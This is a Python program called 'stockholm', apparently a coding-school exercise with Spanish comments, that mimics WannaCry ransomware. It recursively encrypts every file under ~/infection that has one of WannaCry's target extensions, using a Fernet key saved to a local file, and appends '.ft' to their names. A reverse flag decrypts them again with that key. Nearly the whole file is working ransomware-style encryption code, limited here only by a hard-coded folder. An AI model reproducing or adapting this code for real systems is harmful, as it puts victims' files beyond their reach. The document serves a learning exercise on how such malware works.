"""
STOCKHOLM:
    - Desarrollado para Linux o MacOS
    - Solo actua en la carpeta /home/$USER/infection
    - Actua solo sobre los archivos con extensiones que fueron infectados por
    Wannacry
    - Renombra todos los archivos de la carpeta añadiendo la extension '.ft'
    (si ya tienen esa extensión no se vuelve a añadir)
    - Argumentos:
        - '-h' o '--help' muestra la ayuda
        - '-v' o '--version' muestra la versión del programa
        - '-r' o '--reverse' junto con la clave introducida revierte la
        infección
        - '-s' o '--silent' el programa no producirá ningún output
    - El programa maneja los errores y no se detiene en ningún caso
"""

import argparse
import os
from pathlib import Path
from cryptography.fernet import Fernet

ext_lst = ('.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.ARC',
           '.PAQ', '.accdb', '.aes', '.ai', '.asc', '.asf', '.asm', '.asp',
           '.avi', '.backup', '.bak', '.bat', '.bmp', '.brd', '.bz2', '.c',
           '.cgm', '.class', '.cmd', '.cpp', '.crt', '.cs', '.csv', '.db',
           '.dbf', '.dch', '.der', '.dif', '.dip', '.djvu', '.doc', '.docb',
           '.docm', '.docx', '.dot', '.dotm', '.dotx', '.dwg', '.edb', '.eml',
           '.fla', '.flv', '.frm', '.gif', '.gpg', '.gz', '.h', '.hwp', '.ibd',
           '.iso', '.jar', '.java', '.jpeg', '.jpg', '.js','.jsp', '.lay',
           '.lay6', '.ldf', '.m3u', '.m4u', '.max', '.mdb', '.mdf', '.mid',
           '.mkv', '.mml', '.mov', '.mp3', '.mp4', '.mpeg', '.mpg', '.msg',
           '.myd', '.myi', '.nef', '.odb', '.odg', '.odp', '.ods', '.odt',
           '.onetoc2', '.ost', '.otg', '.otp', '.ots', '.ott', '.pas', '.pdf',
           '.pem', '.pfx', '.php', '.pl', '.png', '.pot', '.potm', '.potx',
           '.ppam', '.pps', '.ppsm', '.ppsx', '.ppt', '.pptm', '.pptx', '.ps1',
           '.psd', '.pst', '.rar', '.raw', '.rb', '.rtf', '.sch', '.sh',
           '.sldm', '.sldx', '.slk', '.sln', '.snt', '.sql', '.sqlite3',
           '.sqlitedb', '.stc', '.std', '.sti', '.suo', '.svg', '.swf', '.sxc',
           '.sxd', '.sxi', '.sxm', '.sxw', '.tar', '.tbk', '.tgz', '.tif',
           '.tiff', '.txt', '.uop', '.uot', '.vb', '.vbs', '.vcd', '.vdi',
           '.vmdk', '.vmx', '.vob', '.vsd', '.vsdx', '.wav', '.wb2', '.wk1',
           '.wks', '.wma', '.wmv', '.xlc', '.xlm', '.xls', '.xlsb', '.xlsm',
           '.xlsx', '.xlt', '.xltm', '.xltx', '.xlw', '.zip', 'csr', 'p12')

def leer_argumentos():
    parser = argparse.ArgumentParser(
        description= "Encripts files in /home/$USER/infection directory")

    parser.add_argument(
        "-r", "--reverse", 
        help = "Decript files in '/home/$USER/infection'. Key file must be specified as argument.",
        metavar = "KEY"
        )
    parser.add_argument(
        "-s", "--silent",
        help = "No output will be shown in terminal",
        action = 'store_true'
        )
    parser.add_argument(
        "-v", "--version",
        help = "Shows program version",
        action = 'store_true'
        )

    arg = parser.parse_args()

    return arg.reverse, arg.silent, arg.version


def get_files(carpeta, file_ext = None):
    """
    Devuelve una lista con todos los ficheros, con unas determinadas
    extensiones, situados dentro del directorio 'carpeta' y sus
    subdirectorios.
    """

    if not os.path.isdir(carpeta):
        print("ERROR: No es una carpeta")
        exit(1)
    
    filedir_list = os.listdir(carpeta)
    valid_files = []
    for fich in filedir_list:
            
        # Si es una carpeta, añadimos los ficheros de la subcarpeta
        if os.path.isdir(carpeta + '/' + fich):
            valid_files += get_files(carpeta + '/' + fich, file_ext)
        
        # Case-insensitive con .lower()
        elif file_ext != None:
            if fich.lower().endswith(file_ext):
                valid_files.append(carpeta + '/' + fich)
        else:
            valid_files.append(carpeta + '/' + fich)

    return valid_files


def generar_clave():
    """
    Genera la clave para la encriptacion y desencriptacion.
    La almacena en el fichero 'filekey.key'
    """

    # Genera la clave
    key = Fernet.generate_key()
    """
    La clave generada se compone de dos claves más pequeñas:
        - Una 128-bit AES encryption key
        - Una 128-bit SHA256 HMAC signing key 
    """

    # Almacena la clave en un fichero
    with open('filekey.key', 'wb') as filekey:
        filekey.write(key)


def encriptar(path):
    """
    Encripta todos los archivos del path con una extensión de ext_list.
    """

    # Comprueba si ya existe una clave (lo dejo en la evaluación por si acaso,
    # para no perderla en caso de ejecutar el código 2 veces)
    if not os.path.exists('filekey.key'):
        generar_clave()

    # Abrir clave
    with open('filekey.key', 'rb') as filekey:
        key = filekey.read()
    
    # Usar la clave
    fernet = Fernet(key)

    # Obtener ficheros a encriptar
    files2encrypt = get_files(path, ext_lst)
    if not silent and len(files2encrypt) == 0:
        print("No hay archivos para cifrar en", path)
    elif not silent:
        print("Los ficheros que se van a encriptar son:", len(files2encrypt))
        print(*files2encrypt, sep='\n')
        print("")

    # Bucle de encriptación de cada fichero
    k = 0
    for f2encrypt in files2encrypt:

        if os.path.isfile(f2encrypt):

            # Obtener el contenido del fichero
            with open(f2encrypt, 'rb') as f:
                f_data = f.read()
    
            try:
                # Obtener el contenido cifrado
                f_data_encrypt = fernet.encrypt(f_data)

                # Abrir el fichero y sobreescribir por el encriptado
                with open(f2encrypt, 'wb') as f_encriptado:
                    f_encriptado.write(f_data_encrypt)
                    if not silent:
                        print("Se ha ENCRIPTADO:", f2encrypt)
                
                # Renombrar el fichero
                os.rename(f2encrypt, f2encrypt + '.ft')

                k += 1

            except Exception:
                if not silent:
                    print(f2encrypt, "no se puede encriptar")

        else:
            if not silent:
                print(f2encrypt, "no es un fichero")

    if not silent:
        print("")
        print(f"Número total de ficheros encriptados en {path}: {k}")
        print("")



def desencriptar(path, key_file = 'filekey.key'):
    """
    Desencripta todos los archivos del path que hayan sido encriptados con 'key'.
    """

    # Abrir clave
    with open(key_file, 'rb') as filekey:
        key = filekey.read()
    
    # Usar la clave
    fernet = Fernet(key)

    # Obtener los ficheros a desencriptar
    files2decrypt = get_files(path, ".ft")
    if not silent and len(files2decrypt) == 0:
        print("No hay archivos para desencriptar")
    elif not silent:
        print("Los ficheros que se van a desencriptar son:", len(files2decrypt))
        print(*files2decrypt, sep='\n')
        print("")

    # Bucle de desencriptación de cada fichero
    k = 0
    for f2decrypt in files2decrypt:
        
        if os.path.isfile(f2decrypt):

            with open(f2decrypt, 'rb') as f:
                f_data_encrypted = f.read()
        
            try:
                # Obtener el fichero descifrado
                f_data = fernet.decrypt(f_data_encrypted)

                # Abrir el fichero y sobreescribir por el encriptado
                with open(f2decrypt, 'wb') as f_desencriptado:
                    f_desencriptado.write(f_data)
                    if not silent:
                        print("Se ha DESCIFRADO:", f2decrypt)
                
                # Renombrar el fichero
                os.rename(f2decrypt, f2decrypt[:-3])

                k += 1

            except Exception:
                if not silent:
                    print(f2decrypt, "no se puede desencriptar, ",
                    "no se ha encriptado con la misma clave o",
                    "no está encriptado")

        else:
            if not silent:
                print(f2decrypt, "no es un fichero")


    if not silent:
        print("")
        print(f"Número tota de ficheros desencriptados en {path}: {k}")
        print("")

if __name__ == '__main__':
    version = "2.0"
    infection_path = home = str(Path.home()) + '/infection'

    reverse_keyfile, silent, show_version = leer_argumentos()

    if show_version:
        print(f"stockholm {version}")

    elif not os.path.isdir(infection_path):
        print(f"{infection_path} no existe o no es un directorio")
        exit(1)
    elif not reverse_keyfile:
        if not silent:
            print(f"Encriptando {infection_path}")
        encriptar(infection_path)

    else:
        if not silent:
            print(f"Revirtiendo la encriptación en {infection_path}")
        desencriptar(infection_path, reverse_keyfile)